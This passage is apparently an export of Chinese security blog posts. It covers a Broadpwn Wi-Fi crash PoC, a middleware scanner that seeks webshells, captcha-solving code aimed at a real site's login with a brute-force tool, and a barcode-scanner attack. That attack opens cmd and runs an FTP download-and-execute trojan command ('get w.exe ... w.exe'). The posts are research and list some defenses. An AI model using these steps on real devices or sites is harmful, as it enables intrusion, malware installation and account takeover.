Authentication, SKA）。我这里设置alth_algs的值为1，表示只采用OSA；如果为3则两种认证方式都支持。 9.assocresp_elements:关联响应帧的附加供应商特定信息（翻译过来中文参考，不确定是否正确） 10.vendor_elements：信标和探测响应帧的附加供应商特定元素（翻译过来中文参考，不确定是否正确）3、启动 hostpad1.启动1sudo ./hostapd -B /etc/hostapd.conf 2.启动过程如果出现“Interface wlan0 wasn’t started”错误，先运行下面2行命令12sudo nmcli nm wifi offsudo rfkill unblock wlan 然后继续执行1sudo ./hostapd -B /etc/hostapd.conf 3.目标手机连上指定开启的wifi名称为“YourNetworkNameHere”的wifi，即可看到漏洞被触发，wifi重启。 漏洞利用前面已经了解了漏洞的成因，和简单复现了漏洞。接下来我们要做的是利用漏洞做些事情。后续继续分析将详细给出exploit的编写方法。 参考链接1、Ubuntu上编译hostapd：http://blog.csdn.net/hnllc2012/article/details/491511372、博客参考：http://boosterok.com/blog/broadpwn1/","tags":[{"name":"Poc","slug":"Poc","permalink":"http://www.future-sec.com/tags/Poc/"},{"name":"BROADCOM WI-FI","slug":"BROADCOM-WI-FI","permalink":"http://www.future-sec.com/tags/BROADCOM-WI-FI/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"中间件漏洞检测框架(F-MiddlewareScan)","date":"2016-03-16T16:00:00.000Z","path":"f-middlewarescan.html","text":"Setup实现针对中间件的自动化检测，端口探测-&gt;中间件识别-&gt;漏洞检测-&gt;获取webshell参数说明-h 必须输入的参数，支持ip(192.168.1.1)，ip段（192.168.1），ip范围指定（192.168.1.1-192.168.1.254），最多限制一次可扫描65535个IP。-p 指定要扫描端口列表，多个端口使用,隔开 例如：7001,8080,9999。未指定即使用内置默认端口进行扫描(80,4848,7001,7002,8000,8001,8080,8081,8888,9999,9043,9080)-m 指定线程数量 默认100线程-t 指定HTTP请求超时时间，默认为10秒，端口扫描超时为值的1/2。例子： 123python F-MiddlewareScan.py -h 10.111.1python F-MiddlewareScan.py -h 192.168.1.1-192.168.2.111python F-MiddlewareScan.py -h 10.111.1.22 -p 80,7001,8080 -m 200 -t 6 效果图： 漏洞检测脚本以插件形式存在，可以自定义添加修改漏洞插件，存放于plugins目录，插件标准非常简单，只需对传入的IP，端口，超时进行操作，成功返回“YES|要打印出来的信息”即可。新增插件需要在 plugin_config.ini配置文件中新增关联（多个漏洞插件以逗号隔开）。中间件识别在discern_config.ini文件中配置（支持文件内容和header识别） 目前内置了19个漏洞插件，希望大家可以一起编写更多的插件，目前还缺少weblogic自动部署和反序列化探测以及中间件的反序列化自动获取webshell的插件等等。 下载地址：http://down.future-sec.com/F-MiddlewareScan.rar","tags":[{"name":"python","slug":"python","permalink":"http://www.future-sec.com/tags/python/"},{"name":"自动化检测","slug":"自动化检测","permalink":"http://www.future-sec.com/tags/自动化检测/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/categories/web安全/"}]},{"title":"简单验证码识别及工具编写思路","date":"2016-03-06T16:00:00.000Z","path":"verification_code.html","text":"注：此文章只适合简单验证码，最后也将编写的工具附上以及关键部分代码和使用说明文档。 简介虽然验证码发展到如今有许多人类都难以识别的状态了，但人有部分老系统使用的验证码异常的简单。还有一些网站由于程序员本身的素质或者缺乏相关图像相关的知识，所以并没有自己写验证码的生成程序，而是直接在网上随便复制粘贴一个Demo级别的代码来用，以达到网站有验证码的目的，而忽略了验证码的强弱性，导致很多网站的验证码都是爆款弱验证码。如： 还有更糟糕的比如： 直接就能复制的…这种是完全不知道验证码的意义或者为了应付而做的验证码 处理方式好吧忽略上面的图继续说。 对于那些简单验证码他们的共同点是： 标准字体 背景单简单甚至纯色没有背景 字体并没有粘贴在一起而本文讨论的就是这类的验证码。对于那种连背景都没有的纯色、标准字体、没有黏贴的那种再简单不过了，直接就是100%的识别率。 这种就不讨论了，下面来看看wooyun的验证码。 Wooyun的验证码有两种状态： 一种是白色文字深色背景，一种是黑色文字浅色背景。如果只有一种，无论是那种设定一个阀值都能很好的二值化，但现在的情况却是有两种，所以我能想到的最简单的方式，那好，我就给出两个阀值，对于黑色文字我就用一个较小一点的阀值，对于白色文字我就用一个较大一点的阀值。但是这样还是会出现一个问题，白色文字二值化后背景黑色文字白色 ，而黑色文字二值化后背景白色文字黑色，就像下面一样： 可以看出上面我左边框选区域一切正常，而右边却出了问题，那是因为在我写程序的时候，我认为二值化后文字都是黑色背景是白色，所以我就把黑色区域当作文字来框选，就看到了如上的效果。所以说这是一个问题，不仅要二值化，二值化后还要到底白色是文字还是黑色是文字。 于是我又想到一种办法，通常情况下一张图上背景的面积都会大于文字所占用的面积，所以在二值化的同时我还做了一件事情，二值化的同时记录下黑点个数和白点个数，如果黑点的个数大于了白点的个数，那么我就把黑白反色一下，让黑色像素点变成最少，这样再把黑色像素当作文字处理。 这样做还有一个问题就是，我应该怎么知道什么时候应该使用那一个阀值来二值化，当然办法可以有很多，比如当图像上深色像素多余浅色像素的时候，使用较大阀值，否则相反，不过我并不是这样做的。 在工具上我提供了一个框，让用户输入验证码的字符个数，这样的话我对体统的阀值挨个遍历，二值化后去识别区域，如果框出来的区域个数是有问题的，那么就换下一个阀值，如果所有阀值都遍历完了还是有问题 ，那么这验证码确实也是超出这个工具的范围了，因为这个工具的目的是通用，对于那些需要单独写代码来识别的不在他的能力范围内。 在这之前一些验证码可能还需要一些处理，比如很常见的一些验证码有边框的。 左边是没有裁剪的边框，一起被二值化成为了黑色，然后拆字就悲剧了，右边是裁剪掉了一个像素的把边框去掉了，然后就一切正常了，这种情况就不说了，都懂的。 还有一种比较复杂的情况，因为二值化并不是万能的，并不是说什么验证码一进行二值化后，文字和背景就出来了，下面这张图是我以前程序需要做的百度推广的验证码识别。 上面这张图不怎么能看到效果，因为都是好几年前的事情了，验证码连接访问已经是500了，这张图都是测试的时候的截图。 我描述一下情况吧，上面的验证码，首先有边框、文字、干扰线，即使能把边框裁剪掉，也找不到一个合适的阀值来把线条和文字分离，很简单因为他的线条的颜色比文字的颜色深，如果我的阀值太小，那么我的文字就没有了，只会剩下一些线条在那里。 这图为上面那张图片上验证码的NZ两个字符，在ps中放大的效果(尽管上面图像原来并非保存的png格式已经失真，但大概还是能看到点什么的) 我也去翻了翻以前的代码来看，当初我二值化的时候，并非直接二值化的，在二值化之前还单独对RGB进行了判断，代码截图如下： 百度推广的验证码是我做的第一个验证码识别程序，所以我一直记得很清楚，不是一个二值化就能搞定的，所以说在这个工具中我也加入了同样可以单独处理RGB的功能。 由于百度的这个验证码已经访问不了了，所以我找了一个同样有线条的验证码，但是这个验证码线条颜色比文字颜色浅，所以我就用默认的127作为阀值，假设二值化无法搞定。 用127阀值上面线条一起被黑化了，但是图片中文字颜色接近黑色，而线条颜色却要浅一点，所以判断的时候，可以认为RGB的平均值大于20的就视为背景，就可以这样干。 然后效果就成了这样： 这样线条就被处理掉了，不过这个验证码直接设置阀值就能搞定，只是为了说明，所以采用127作为阀值。还有一点这个验证码和百度的那个他们线条，都是在文字的下方，如果是在文字上方，那么同样的超出了这个工具的范围 ，对于线条在上方的，我想过一些处理方式，假设线条为红色的时候，我在遍历的时候遇到一个红色像素点，我就把红色像素设置为和他相邻像素的非红色的颜色，但是我想了一想这个“相邻”，就涉及了它周围八个像素点，我应该取那一个像素点的颜色。 如果是在背景上还好，他周围应该都是背景的颜色，那一个都无所谓，可是如果是在线条，背景还有文字的交界处就不好处理了，所以工具里面暂时还没提供这样的功能，还有那种很难分离背景或者字黏贴在一起的，但是每个文字都是一个颜色的那种，也想过一些处理方式，但是实现起来我感觉都会存在一些小问题，所以就还展示没有做，就不扯那么多了，等做好了再来扯，才比较有证据。 拆字和识别下面来说说验证码识别中的一个难点 -&gt; 拆字。 基本上在我看来，能正确的拆字，那么就已经成功了80%了，因为剩下的就是比对的问题了，我在工具中只提供了两种方式拆字。 手动添加就不用说了，我这里的自动识别是最传统的深度遍历，从图像的第一个像素点开始遍历，因为图像已经二值化，按照我的工具的理解 ，就只剩下白色背景和黑色文字，所以遇到一个黑色像素点的时候开始记录，然后开始深度遍历，大概效果如下： 大概代码如下： 对于拆字还有很多其他的方式，这里只是最普通的也是最简单的一种，对于其他方式这个工具中并没有提供，因为工具只针对简单通用的验证码，对于那种需要单独写代码的验证码不考虑，而且工具上功能附加太多也就变得复杂了，其实重点就是感觉有点付出和回报不成正比，而且对于那些流传的拆字理论知识，说起来确实简单，但是实际做的时候才会发现，这些理论其实是存在漏洞的，只会在特定条件下才会成立，而验证码却是变幻多端的，这里也就不扯那么多了。 剩下来的就是识别了，我采用的识别方式比较简单，就是两张图来对比，一张是验证码上面截取出来的图像，一张是已知的样本图像。 调用函数会返回这两张图的重叠的像素的个数，这样我把截取出来的验证码字符和我所有的样本对比一次，取出nCount最高的一个作为结果，也就是说取出和样本中重叠率最高的一个出来作为结果，在工具中我有两种方式提供样本，一种是使用系统的字体，一种是手动采集。 如果使用系统字体，在文本框内输入验证码可能出现的字符，然后点击生成，会弹出系统对话框设置字体，从而产生样本，不过对于一些非标准字体，系统字体就很难搞定了，无论是标准字体，还是非标准的字体都建议使用手动采集的方式，因为直接从验证码上截取下来的图怎么说也是原配，重复的图片工具也只会采集一次，不会重复添加降低效率比对，下面就是一个非标准字体。 理论上来说，样本采集越多越全，识别率就越高，反正我每次都是使用的手动采集样本，对了这个工具只是一个配置工具而已，并不能用来做什么其他事情，当一切都配置好了之后，就可以点击工具上的 文件 -&gt; 保存，将这些所有的配置保存成一个文件，可以保存为两种后最(.ci和.ci.png) ，后者以图片保存方便电脑上查看。 而识别是另一个独立的工具调用，如果是.NET，则直接调用提供的dll来识别，之所以这样设计是因为，我并不知道别人，会用验证码识别来做什么事情，所以除了识别以外，我也不知道别人想要什么功能，所以把所有东西全部独立出来，供别人调用或者使用，对于识别我提供了一个命令行调用工具供给非.NET平台的程序调用。 以python举例： 12345678# coding: UTF-8 import os result = os.popen('verifytool.exe D:\\\\woo.ci.png -f D:\\\\woo-verify.png').readlines() print (result) # coding: UTF-8 import os result = os.popen('verifytool.exe D:\\\\woo.ci.png -f D:\\\\woo-verify.png').readlines() print (result) 在我的D盘有这样一张图： 这样别人就可以自己写脚本去做自己爱做的事情，不过我还是建议使用-p的方式来调用。123456789# coding: UTF-8 import urllib2 from socket import * h = urllib2.urlopen('http://www.wooyun.org/captcha.php') str = h.read() #获取验证码 s = socket(AF_INET,SOCK_DGRAM); s.sendto(str,('localhost',14250)) #将获取到的验证码发送给识别程序 code = s.recvfrom(65500) #接受识别出来的验证码 print(code) 如果程序是.NET平台编写，则可直接使用VerifyReader.dll文件，将其添加引用然后： 123CodeInfo ci = CodeInfo.LoadFromFile('D:\\\\woo.ci.png');CodeHelper helper = new CodeHelper(ci);string code = helper.GetCodeString(Image.FromFile('D:\\\\woo-verify.png'));此处输入代码 另外这里还单独的做了一个账户爆破的工具出来： 以下是用自己测试的结果： 双击列表即可查看数据 相关链接全套工具及核心代码和使用说明下载连接：http://down.future-sec.com/VerifyReader-1.1.zip","tags":[{"name":"python","slug":"python","permalink":"http://www.future-sec.com/tags/python/"},{"name":"验证码","slug":"验证码","permalink":"http://www.future-sec.com/tags/验证码/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/categories/web安全/"}]},{"title":"一维条形码攻击技术(Badbarcode)","date":"2016-02-24T16:00:00.000Z","path":"badbarcode.html","text":"前言在日常生活中，条形码随处可见，特别在超市，便利店，物流业，但你们扫的条形码真的安全吗？之前TK教主在PacSec介绍的条形码攻击和twitter上的demo视频太炫酷，所以就自己买了个扫码器自己研究了一下 ，在研究时候也找遍了国内外所有资料，但是都没有对可以执行的攻击技术完整的文章，故有此文分享。 条形码介绍条形码(barcode)是将宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符。常见的条形码是由反射率相差很大的黑条（简称条）和白条（简称空）排成的平行线图案。常见的条形码类型有code39 code128 code93 EAN128 EAN13QR等，前面大部分是一维条形码，而QR则是二维条形码，本文重点针对支持一维条形码的扫码器。其中code128是使用最广泛，支持字符最多的一种类型，一般都利用code128条形码进行攻击。 扫码器介绍扫码器，大家几乎每天都能看到，在超市付账，物流，医院，彩票等。作用就是把条形码的信息提取出来，而常规的扫码器的工作原理是利用红外线照射，然后反射得出条形码的信息，再用扫描器内置的芯片处理得出结果。国际上常用的扫描器品牌有Symbol，Honeywell，Datalogic等，其中symbol已被摩托罗拉收购。大家在超市购物付账时候都注意到，商品通过扫描后，商品的编码直接显示在屏幕上，其实很多扫码器都是用keyboard的方式输入的，也就是说一个扫描器就相当于一个键盘，这是一个较大的风险。 Code128条形码既然知道扫描器是一个keyboard设备，只要控制条形码的数据就可以随意输入键盘数据了。但例如UPC条形码只支持数字，有些则只支持数字与字母，而Code128 是一种广泛使用的条形码类型，因为它支持ASCII0-127字符，所以叫code128，条形码长度可调，最大支持232个字符。Code128也分为三种： Code128A：标准数字和大写字母，控制符，特殊字符 Code128B：标准数字和大写字母，小写字母，特殊字符 Code128C/EAN128：[00]-[99]的数字对集合，共100个，即只能表示偶数位长度的数字。Code128由四部分组成:起始码，数据码，校验码(可有可无)，结束码 如上条形码，黑白相间，且线条粗细不一；由黑色线条(条，Bar)与空白(空，Space)组成，根据粗细程度，可以将以上条形码起始码解读为:211214；第一条黑色竖线是由两个单位的竖线合并组成，而第二条空白竖线即由一个单位的竖线，如此类推。一般前6条的Bar与Space为一个单元。211214 用1,0转成逻辑码就是11010010000，也即是起始码。起始码对照：128A 11010000100128B 11010010000128C 11010011100 结束码都是统一的1100011101011根据上面的解读出的逻辑码11010010000，就可以推断上面那个条形码是属于code128-B类型了。 最后再根据code128的编码表就可以分析出条形码的数据（编码表太长就不贴完了）0x04 控制字符与条形码生成根据上面分析的code128规则，已经可以自己写出一个读取识别和生成条形码的程序了。而我们是要执行操作，最简单的就是利用控制字符。控制字符即非显示字符，例如回车，换行，制表符等。在ASCII中，0-31和127 就是控制字符。根据ASCII的控制字符表，可以看出Ctrl+?的组合键几乎都有了，例如Ctrl+O，也就是打开文件，但这个只是局部快捷组合键，在一些程序中才能应用，例如浏览器，word等等，利用这些控制字符在某些终端可以使程序跳出沙盒。如何生成可以使计算机执行Ctrl+O的条形码？因为已经上面已经介绍过code128的规则算法，自己写程序也可以。网络也有很多条形码生成的小程序，但在这里推荐一个强大的条形码编辑工具：BarTender 下载安装后点击菜单栏“文件”-“新建”-“完成”，就会出现一个空白模板。 然后点击条形码按钮就可以创建自己的条形码，选择code128类型。 利用BarTender轻松就可以生成出条形码，而且字符可以随时改动，方便调试。扫描上图就验证码后，会输入“FutureSec”，然后输入控制字符Ctrl+O 扫码器扫描后立即弹出对话框市面上基本任何一款扫码器都能执行，因为code128是绝大部分扫码器都支持的。0x05 Advanced Data Formatting（高级数据格式）Advanced Data Formatting（ADF），高级数据格式。是摩托罗拉针对扫描器开发的一种更高级的数据输入，根据自己的设定一步一步的规则可以自定义输入的数据，也可以说是一种支持编程的条形码技术。例如，在一个结账系统中，当你对一个商品扫描后，由于该结账系统不能直接对该条形码直接处理，就需要这种技术。结账系统识别码：A12345，前面要A开头；条形码的数据类型：12345 纯数字，想要在这个结账系统中识别就要在输入前进行处理。再举个例子：条形码的数据：8523647122通过ADF输出的数据：8523641&amp;lt;Enter&amp;gt;如何实现ADF？ 现在网上仍然没有ADF的中文资料，而在外国的网站也寥寥无几，无人问津，但靠tk的ppt中提到的ADF也是一头雾水，因为没有具体技术描述，只是一行字带过。后来找到一份摩托罗拉撰写300多页的ADF指南PDF。ADF是一种编程，根据自己的需求构建规则，而用的就不是用代码进行编程而是条形码。ADF把所有规则都用条形码表示，例如Perfix/Suffix，Replace，字符输入等。利用ADF挟持扫描器数据对扫描器进行ADF设置时要先扫描开始模式，Begin New Rule 此后开始扫描的条形码都会被添加规则，前提是规则的逻辑是合法的。随后依次扫描下列条形码 然后Save Rule 当Save Rule，扫描器的输出数据都会被挟持成“TEST”，当你设置了ADF时，就会把你的规则按流程一步一步执行。如何恢复？ 扫描清除所有规则条形码即可。 利用ADF执行命令，种植木马由于单凭控制字符无法执行命令，而ADF支持简单的编程和更多的键，利用ADF可以轻松执行系统命令。由于ADF支持很多键，例如最有用的WIN+R。 在ADF中称为GUI R，既然知道了可以WIN+R的键，利用上面的规则就可以弹出cmd执行了。但这样还是不行，因为输入的是由系统自动输入，速度是手打无法可比的，当你执行到GUI R，再执行”c”,”m”,”d”， win+r的对话框还没有出来就已经输入了cmd，所有要延时，而ADF就支持，相当于编程中的 sleep()。 在录ADF规则时，扫描延时后要输入两个Numeric，例如依次0和1两个码，就代表延时0.1秒，0和5就代表0.5秒，默认是延时1秒。知道这些ADF条形码后就可以构建弹出cmd，然后再利用控制字符执行命令，主要是Enter。但如果要按照以上这么搞的话，仅是弹出一个cmd窗口就要十多个条形码了，也就是说扫描器要扫十多次。可以先看看腾讯玄武实验室的demo视频：https://twitter.com/tombkeeper/status/663730674017300480视频中用了一叠条形码，依次扫描，扫描了十多次就出来个cmd，可能这与扫描器型号也有关系。 这样的话不管是规则生成和利用都非常繁琐，其实是可以优化的，ADF的规则可以合并。利用motorola的扫描器。 123scan是摩托罗拉官方出品非常强大的扫描器 管理软件，在其官网可以下载。功能很多，在这里就介绍利用123scan设置ADF。打开后点击”Create new configuration file”-&gt;”My scanner is NOTconnected”-&gt;选择扫描器-&gt;”Mondify data”-&gt;”Program complex data modifications”-&gt;”Create a new rule”。 点击Add action就是添加规则。 ADF所有规则都在里面，包括Beep控制（控制扫描器蜂鸣），Replace等。 设置延时0.5秒，依次添加规则。 最后会自动合并条形码并输出。 以上就是执行任意命令的条形码payload，除去1和2的设置出厂设置和清除所有规则，只需要4个条形码就可以执行任意单条命令。其中SendALL that remains是代表设置ADF后扫描条形码的原本数据。以上四组条形码的ADF流程是:输入WIN+R键-&gt;延时0.5秒-&gt;输入c键-&gt;输入m键-&gt;输入d键-&gt;输入回车-&gt;延时0.5秒-&gt;执行条形码的内容，而随后的Send ALL thatremains就是你要执行的命令，可以多行命令，要是单行命令基本上4条就够不需要加Send ALL that remains。利用ADF种植木马既然已经可以执行cmd命令，最简单的方法就是利用ftp下载执行任意程序。上面提到的Send ALL that remains可以用BarTender生成出FTP命令。 #!bash ftp test?CR?a?CR?a?CR?get w.exe?CR?bye?CR?w.exe?CR?get w.exe?CR?bye?CR?w.exe?CR? 下面给出我们的demo视频，是已经经过扫描四次ADF设置后。不管扫描什么条形码执行到Send ALL that remains。视频中是利用FTP命令执行。（测试型号Symbol-LS4208-SR20001ZZR）http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2密码:wooyun520 攻击场景简单总结一下可能存在攻击的场景地点: 商店付款 直接把条形码替换到商品；很多便利店支持微信，支付宝二维码支付，扫描器也支持多个类型条形码，可以直接把条形码存在手机中，让其扫描；有些大型百货有资助价格查询终端，只要用特殊的条形码到终端一扫就能跳出终端。 医院病历，检验单 现在医院的挂号，病历都会有个条形码，直接到医院自主终端或直接递给护士扫描；去医院都知道，有资助出检验单的终端，只要一扫就会单子，基本每个医院都有了。 彩票 彩票自身都会有条形码，兑换彩票就凭靠条形码到机器识别，所以伪造或对检验机进行攻击还是有可能，彩票终端类型这么多。 快递单子 快递都有条形码，一般是code128或者code39类型。在一些快递自助取件柜，和快递小哥扫描的时候或许会出现风险。 。。。。。。场景很多就不一一列举了，以上场景有空我会逐一分析。 防范方法 扫码器默认不要开启ADF功能 扫描器尽量不要使用键盘模拟 设置热键黑名单 总结一维条形码攻击的概念在国外很多年前就有提出了，但是没人深入研究。利用条形码也可能出现SQL注射，XSS，溢出等攻击。无论什么设备，只要能控制一部分输入，就存在风险！ 参考文献 http://www.appsbarcode.com/code%20128.php Code 128 條碼．編碼規則 http://www.slideshare.net/mobile/PacSecJP/hyperchem-ma-ba","tags":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/tags/硬件安全/"},{"name":"条形码","slug":"条形码","permalink":"http://www.future-sec.com/tags/条形码/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]}]}